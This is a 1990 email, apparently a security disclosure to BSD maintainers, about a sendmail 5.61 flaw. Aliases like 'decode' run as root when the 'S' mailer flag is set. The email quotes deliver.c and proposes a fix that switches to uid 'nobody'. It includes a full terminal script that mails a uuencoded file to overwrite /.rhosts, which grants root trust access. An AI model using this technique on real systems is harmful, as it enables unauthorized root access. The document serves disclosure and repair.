@@ -1,0 +1,109 @@
+From wbc@sunapee.dartmouth.edu Wed Feb 21 08:33:57 1990
+Date: Wed, 21 Feb 90 11:30:50 -0500
+From: wbc@sunapee.dartmouth.edu (Wayne B. Cripps)
+To: bostic@okeeffe.Berkeley.EDU, wbc@sunapee.dartmouth.edu
+Subject: sendmail and the 'S' flag
+Index: usr.sbin/sendmail/deliver.c 4.3BSD-tahoe
+
+
+here is a script of the security hole in sendmail 5.61. I am actually using
+a version that was modified for use on suns, including the sun
+yp lookup calls, but I have tested this bug on a vax running the regular
+bsd version.  The documentation (Installation and Operations Guide, 
+Appendix C) says that the mailer flag S doesn't set the real uid, which is
+what happens - but if sendmail is run as root the programs should be
+exec'd as nobody or some other "safe" uid.  M_RESTR is the S flag.
+Of course this problem can be avoided by not using any aliases that
+write to files.
+
+(line 885)
+		if (!bitnset(M_RESTR, m->m_flags))
+		{
+			if (ctladdr == NULL || ctladdr->q_uid == 0)
+			{
+				(void) setgid(DefGid);
+				(void) setuid(DefUid);
+			}
+			else
+			{
+				(void) setgid(ctladdr->q_gid);
+				(void) setuid(ctladdr->q_uid);
+			}
+		}
+my fix is to add the else clause (where 32767 is the uid of "nobody"):
+
+		else
+		{
+		    (void) setgid(32767);
+		    (void) setuid(32767);
+		} 
+
+Sorry, but I don't have a context diff.  Let me know if I can help clarify
+things further.
+
+	Wayne
+
+
+Script started on Wed Feb 21 10:30:40 1990
+sunapee% echo "hello there" | uuencode /.rhosts
+begin 666 /.rhosts
+,:&5L;&\@=&AE<F4*
+ 
+end
+sunapee% telnet cabot 25
+Trying 129.170.28.15 ...
+Connected to cabot.
+Escape character is '^]'.
+220 cabot.dartmouth.edu Sendmail 5.61a+YP/4.1 ready at Wed, 21 Feb 90 10:33:47 -0500
+mail from:root
+250 root... Sender ok
+rcpt to:decode
+250 decode... Recipient ok
+data
+354 Enter mail, end with "." on a line by itself
+begin 666 /.rhosts
+,:&5L;&\@=&AE<F4*
+
+end
+.
+250 Ok
+quit
+221 cabot.dartmouth.edu closing connection
+Connection closed by foreign host.
+sunapee% 
+sunapee% cat /export2/root/cabot/.rhosts
+hello there
+
+*  .}M.}O ..}!.b 
+sunapee% echo hello | uuencode ~wbc/.rhosts
+begin 666 /toe/staff/wbc/.rhosts
+&:&5L;&\*
+ 
+end
+sunapee% telnet sunapee 25
+Trying 129.170.28.9 ...
+Connected to sunapee.
+Escape character is '^]'.
+220 sunapee.dartmouth.edu Sendmail 5.61a+YP/4.1 ready at Wed, 21 Feb 90 10:35:44 -0500
+mail from:wbc
+250 wbc... Sender ok
+rcpt to:decode
+250 decode... Recipient ok
+data
+354 Enter mail, end with "." on a line by itself
+begin 666 /toe/staff/wbc/.rhosts
+&:&5L;&\*
+
+end
+.
+250 Ok
+quit
+221 sunapee.dartmouth.edu closing connection
+Connection closed by foreign host.
+sunapee% 
+sunapee% cat ~/.rhosts
+hello
+
+*.3:   .}a.}c ..}U.j 
+script done on Wed Feb 21 10:36:15 1990
+
